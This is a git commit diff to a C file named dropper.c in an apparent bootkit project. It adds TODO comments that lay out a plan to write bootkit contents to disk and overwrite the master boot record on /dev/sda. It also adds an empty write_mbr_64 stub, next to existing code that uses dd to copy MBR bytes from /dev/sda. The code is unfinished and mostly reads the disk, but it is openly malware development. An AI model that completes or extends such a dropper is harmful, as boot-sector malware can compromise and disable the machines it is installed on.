300933ba4aac432b147dba78c465a862f54c3554
oneiroi <on@ei.roi>
2024-01-07 12:54:59 -0500

    dropper notes

--- src/bootkit/dropper/dropper.c
+++ src/bootkit/dropper/dropper.c
@@ -14,14 +14,23 @@ int main()
 #else
     int err = save_orig_mbr_64();
 #endif
-
     if (err == 0) {
         printf("success\n");
     } else {
         fprintf(stderr, "error\n");
+        exit(EXIT_FAILURE);
     }
 
-    return 0;
+    // TODO check for sector on disk to write the bootkit contents
+    
+    // TODO write bootkit to disk 
+
+    // TODO update bootkit_dap in bootloader.bin
+
+    // TODO write 64 bytes of bootloader.bin to the MBR on /dev/sda
+
+
+    exit(EXIT_SUCCESS);
 }
 
 /*
@@ -40,4 +49,12 @@ int save_orig_mbr_64()
 {
     printf("Writing original MBR 64 bytes to bootkit\n");
     return system("dd if=/dev/sda of=bootkit.bin bs=1 count=64 seek=4 conv=notrunc");
+}
+
+/*
+    Copies the first 64 bytes from the our MBR to /dev/sda to bootkit.bin
+*/
+int write_mbr_64()
+{
+
 }
